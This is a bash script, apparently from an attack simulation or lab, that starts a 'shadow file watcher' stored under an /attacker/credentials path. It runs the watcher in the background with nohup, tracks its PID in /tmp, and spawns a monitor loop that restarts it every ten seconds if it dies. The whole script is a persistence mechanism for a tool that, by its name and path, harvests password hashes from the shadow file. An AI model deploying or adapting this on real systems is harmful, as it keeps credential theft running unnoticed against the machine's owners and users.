#!/bin/bash
#
# start_watcher.sh - Start the shadow file watcher and keep it running
# This script ensures the watcher stays alive and restarts it if it dies
#

WATCHER_SCRIPT="/attacker/credentials/shadow_watcher.sh"
PID_FILE="/tmp/watcher.pid"
LOG_FILE="/tmp/watcher.log"

# Function to check if watcher is running
is_watcher_running() {
    if [ -f "$PID_FILE" ]; then
        PID=$(cat "$PID_FILE" 2>/dev/null)
        if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
            return 0  # Running
        fi
    fi
    return 1  # Not running
}

# Function to start watcher
start_watcher() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WATCHER] Starting shadow file watcher..." >> "$LOG_FILE"
    nohup bash "$WATCHER_SCRIPT" >> /tmp/watcher_output.log 2>&1 &
    WATCHER_PID=$!
    echo "$WATCHER_PID" > "$PID_FILE"
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WATCHER] Watcher started (PID: $WATCHER_PID)" >> "$LOG_FILE"
}

# Ensure log file exists
touch "$LOG_FILE" 2>/dev/null || true

# Check if watcher is already running
if is_watcher_running; then
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WATCHER] Watcher is already running (PID: $(cat $PID_FILE))" >> "$LOG_FILE"
    exit 0
fi

# Start watcher
start_watcher

# Give it a moment to start
sleep 2

# Verify it started
if is_watcher_running; then
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WATCHER] Watcher started successfully (PID: $(cat $PID_FILE))" >> "$LOG_FILE"
else
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WATCHER] ERROR: Watcher failed to start!" >> "$LOG_FILE"
    exit 1
fi

# Monitor and restart if needed (run in background)
(
    while true; do
        sleep 10
        if ! is_watcher_running; then
            echo "$(date '+%Y-%m-%d %H:%M:%S') [WATCHER] Watcher died, restarting..." >> "$LOG_FILE"
            start_watcher
            sleep 2
        fi
    done
) &
MONITOR_PID=$!
echo "$MONITOR_PID" > /tmp/watcher_monitor.pid
echo "$(date '+%Y-%m-%d %H:%M:%S') [WATCHER] Monitor started (PID: $MONITOR_PID)" >> "$LOG_FILE"

